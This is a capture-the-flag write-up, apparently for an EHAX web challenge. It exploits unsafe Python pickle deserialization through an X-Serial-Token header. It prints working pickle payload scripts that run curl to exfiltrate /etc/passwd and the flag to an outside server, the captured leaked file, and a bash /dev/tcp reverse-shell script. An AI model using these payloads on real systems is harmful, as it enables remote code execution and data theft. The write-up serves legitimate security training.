This challenge first presents a simple JSfuck task to retrieve the secret path: **/t0p_s3cr3t_p4g3_7_7**

The response provides a hint to use the `X-Serial-Token` to inject a serialized object, specifically a Python pickle, in order to read the contents of a file.

To read one file's content. I can use this script:
```py
import pickle
import os
import base64

class Exploit:
    def __reduce__(self):
        return (os.system, ("curl -G --data-urlencode @/etc/passwd https://my-sever",))

payload = pickle.dumps(Exploit())
encoded_payload = base64.b64encode(payload).decode()

print(encoded_payload)
```
The captured request is as follows:
```
GET /?root%3ax%3a0%3a0%3aroot%3a%2froot%3a%2fbin%2fbash%0adaemon%3ax%3a1%3a1%3adaemon%3a%2fusr%2fsbin%3a%2fusr%2fsbin%2fnologin%0abin%3ax%3a2%3a2%3abin%3a%2fbin%3a%2fusr%2fsbin%2fnologin%0asys%3ax%3a3%3a3%3asys%3a%2fdev%3a%2fusr%2fsbin%2fnologin%0async%3ax%3a4%3a65534%3async%3a%2fbin%3a%2fbin%2fsync%0agames%3ax%3a5%3a60%3agames%3a%2fusr%2fgames%3a%2fusr%2fsbin%2fnologin%0aman%3ax%3a6%3a12%3aman%3a%2fvar%2fcache%2fman%3a%2fusr%2fsbin%2fnologin%0alp%3ax%3a7%3a7%3alp%3a%2fvar%2fspool%2flpd%3a%2fusr%2fsbin%2fnologin%0amail%3ax%3a8%3a8%3amail%3a%2fvar%2fmail%3a%2fusr%2fsbin%2fnologin%0anews%3ax%3a9%3a9%3anews%3a%2fvar%2fspool%2fnews%3a%2fusr%2fsbin%2fnologin%0auucp%3ax%3a10%3a10%3auucp%3a%2fvar%2fspool%2fuucp%3a%2fusr%2fsbin%2fnologin%0aproxy%3ax%3a13%3a13%3aproxy%3a%2fbin%3a%2fusr%2fsbin%2fnologin%0awww-data%3ax%3a33%3a33%3awww-data%3a%2fvar%2fwww%3a%2fusr%2fsbin%2fnologin%0abackup%3ax%3a34%3a34%3abackup%3a%2fvar%2fbackups%3a%2fusr%2fsbin%2fnologin%0alist%3ax%3a38%3a38%3aMailing+List+Manager%3a%2fvar%2flist%3a%2fusr%2fsbin%2fnologin%0airc%3ax%3a39%3a39%3aircd%3a%2frun%2fircd%3a%2fusr%2fsbin%2fnologin%0a_apt%3ax%3a42%3a65534%3a%3a%2fnonexistent%3a%2fusr%2fsbin%2fnologin%0anobody%3ax%3a65534%3a65534%3anobody%3a%2fnonexistent%3a%2fusr%2fsbin%2fnologin%0actfuser%3ax%3a1000%3a1000%3a%3a%2fhome%2fctfuser%3a%2fbin%2fsh%0a HTTP/1.1
Host: em4judd6e65q353ovx5r0yz3full9bx0.oastify.com
User-Agent: curl/7.88.1
```

To perform remote code execution (RCE), I first redirect the output of my command to a file, and then read it. For this, I used two scripts:
```py
return (os.system, ("echo $(ls -la) > /tmp/output.txt",))
```
```py
return (os.system, ("curl -G --data-urlencode @/tmp/output.txt https://my-sever",))
```
Which return:
```
total 936
dr-xr-xr-x 1 ctfuser ctfuser   4096 Feb 16 03:19  ./
drwxr-xr-x 1 root    root      4096 Feb 16 03:20  ../
-r-xr-xr-x 1 ctfuser ctfuser    331 Feb 16 03:18  Dockerfile
-r-xr-xr-x 1 ctfuser ctfuser     40 Jan  5 13:12  FLAG
-r-xr-xr-x 1 ctfuser ctfuser    199 Feb 16 03:19  Makefile
-r-xr-xr-x 1 ctfuser ctfuser     13 Dec 22 18:28  README.md
-r-xr-xr-x 1 ctfuser ctfuser   1571 Feb 16 02:46  main.py
-r-xr-xr-x 1 ctfuser ctfuser 909879 Feb 16 03:16  output.zip
-r-xr-xr-x 1 ctfuser ctfuser    109 Feb 16 02:37  requirements.txt
dr-xr-xr-x 1 ctfuser ctfuser   4096 Jan  2 13:06  static/
-r-xr-xr-x 1 ctfuser ctfuser    383 Feb 16 03:14  temp.py
dr-xr-xr-x 1 ctfuser ctfuser   4096 Jan  2 13:25  templates/
```
Finally, I made the following request to retrieve the flag:
```
GET /t0p_s3cr3t_p4g3_7_7 HTTP/1.1
Host: chall.ehax.tech:8008
X-Serial-Token: gASVcQAAAAAAAACMBXBvc2l4lIwGc3lzdGVtlJOUjFZjdXJsIC1HIC0tZGF0YS11cmxlbmNvZGUgZGF0YUBGTEFHIGh0dHA6Ly9lbTRqdWRkNmU2NXEzNTNvdng1cjB5ejNmdWxsOWJ4MC5vYXN0aWZ5LmNvbZSFlFKULg==
```

Flag:
```
E4HX{oh_h3l1_n44www_y0u_8r0k3_5th_w4l1}
```

Excellent reverse shell for this challenge:
```py
import pickle
import base64
import os
import requests

class RCE:
    def __reduce__(self):
        return (os.system, ("/bin/bash -c 'bash -i >& /dev/tcp/ATTACKER IP/8008 0>&1'",))

payload = pickle.dumps(RCE())
encoded_payload = base64.b64encode(payload).decode()

headers = {"X-Serial-Token": encoded_payload}


response = requests.get("http://chall.ehax.tech:8008/t0p_s3cr3t_p4g3_7_7", headers=headers)
print(response.text)
```